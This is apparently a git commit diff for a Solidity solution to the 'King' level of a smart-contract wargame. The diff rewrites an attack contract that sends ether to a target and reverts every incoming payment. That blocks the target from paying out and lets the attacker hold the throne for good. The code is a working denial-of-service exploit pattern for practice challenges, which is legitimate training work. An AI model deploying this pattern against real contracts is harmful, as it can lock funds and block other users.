abc739bbd6a3aea61c414ed77bf9d48fbed63bf5
zhou <1036767219@qq.com>
2023-01-31 14:47:08 +0800

    update King

--- 10_King.sol
+++ 10_King.sol
@@ -1,8 +1,8 @@
-pragma solidity ^0.6.12;
+pragma solidity ^0.6.0;
 
-contract att1{
-    function a() public payable{
-        0x5aD9675495Cce5D9D0d1245Ef738CAdC45828E46.call{value : 1.1 ether}("");
+contract attack{
+    constructor(address _addr) public payable{
+        _addr.call{value : msg.value}("");
     }
     receive() external payable{
         revert();
